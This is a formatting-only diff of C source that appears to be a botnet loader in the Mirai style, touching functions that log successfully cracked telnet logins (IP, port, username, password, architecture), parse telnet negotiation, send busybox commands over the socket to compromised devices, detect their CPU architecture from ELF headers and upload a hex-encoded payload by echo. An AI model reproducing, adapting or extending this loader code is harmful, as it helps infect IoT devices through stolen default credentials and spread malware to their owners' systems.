@@ -58,18 +58,18 @@ void connection_close(struct connection *conn)
         {
             ATOMIC_INC(&conn->srv->total_successes);
             fprintf(stderr, "OK|%d.%d.%d.%d:%d %s:%s %s\n",
-                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
-                ntohs(conn->info.port),
-                conn->info.user, conn->info.pass, conn->info.arch);
+                    conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
+                    ntohs(conn->info.port),
+                    conn->info.user, conn->info.pass, conn->info.arch);
         }
         else
         {
             ATOMIC_INC(&conn->srv->total_failures);
             fprintf(stderr, "ERR|%d.%d.%d.%d:%d %s:%s %s|%d\n",
-                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
-                ntohs(conn->info.port),
-                conn->info.user, conn->info.pass, conn->info.arch,
-                conn->state_telnet);
+                    conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
+                    ntohs(conn->info.port),
+                    conn->info.user, conn->info.pass, conn->info.arch,
+                    conn->state_telnet);
         }
     }
     conn->state_telnet = TELNET_CLOSED;
@@ -123,7 +123,7 @@ int connection_consume_iacs(struct connection *conn)
             }
             else
             {
-                iac_wont:
+            iac_wont:
 
                 if (!can_consume(conn, ptr, 2))
                     break;
@@ -389,7 +389,7 @@ int connection_consume_mounts(struct connection *conn)
                                 VERIFY_STRING_HEX, path, path, path, path, path);
             }
 
-            dirs_end_line:
+        dirs_end_line:
             linebuf_pos = 0;
         }
         else if (conn->rdbuf[i] == ' ' || conn->rdbuf[i] == '\t')
@@ -405,7 +405,7 @@ int connection_consume_mounts(struct connection *conn)
     }
 
     util_sockprintf(conn->fd, "/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\r\n",
-                                VERIFY_STRING_HEX);
+                    VERIFY_STRING_HEX);
 
     util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
     return prompt_ending;
@@ -478,18 +478,18 @@ int connection_consume_arch(struct connection *conn)
 
         switch (ehdr->e_ident[EI_DATA])
         {
-            case EE_NONE:
-                return 0;
-            case EE_BIG:
+        case EE_NONE:
+            return 0;
+        case EE_BIG:
 #ifdef LOADER_LITTLE_ENDIAN
-                ehdr->e_machine = htons(ehdr->e_machine);
+            ehdr->e_machine = htons(ehdr->e_machine);
 #endif
-                break;
-            case EE_LITTLE:
+            break;
+        case EE_LITTLE:
 #ifdef LOADER_BIG_ENDIAN
-                ehdr->e_machine = htons(ehdr->e_machine);
+            ehdr->e_machine = htons(ehdr->e_machine);
 #endif
-                break;
+            break;
         }
 
         /* arm mpsl spc m68k ppc x86 mips sh4 */
@@ -582,7 +582,7 @@ int connection_upload_echo(struct connection *conn)
         connection_close(conn);
         return 0;
     }
-    
+
     if (conn->echo_load_pos == conn->bin->hex_payloads_len)
         return offset;
 
